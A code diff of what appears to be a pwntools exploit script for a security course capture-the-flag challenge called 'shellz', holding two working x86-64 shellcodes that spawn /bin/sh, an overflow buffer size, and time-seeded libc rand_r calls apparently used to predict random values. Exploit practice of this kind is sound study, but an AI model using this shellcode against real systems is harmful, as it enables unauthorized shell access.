@@ -2,13 +2,9 @@ from pwn import *
 import re, time, random
 from ctypes import CDLL, c_uint, c_int, byref
 
-
+# 6447.lol 3002
 PROGRAM_PATH = (Path(__file__).parent / "shellz").resolve().__str__()
 BUFF_SIZE = 8192 + 8  # 0x2000
-# BUFF_SIZE = 0x88
-# CANARY = 123456789
-# This shell code is 23 bytes
-# Run /bin/sh
 SHELL_CODE = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
 Shellcode2 = b"\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05"
 
@@ -50,7 +46,7 @@ libc.rand_r.argtypes = [
     c_uint.__class__,
 ]  # see rand_r example below
 
-seed = math.trunc(time.time()) + 1
+seed = math.trunc(time.time())
 print(f"Time now is: {seed}")
 print(f"Time now is: {hex(seed)}")
 # Basic (global-state) rand/srand — same semantics as C
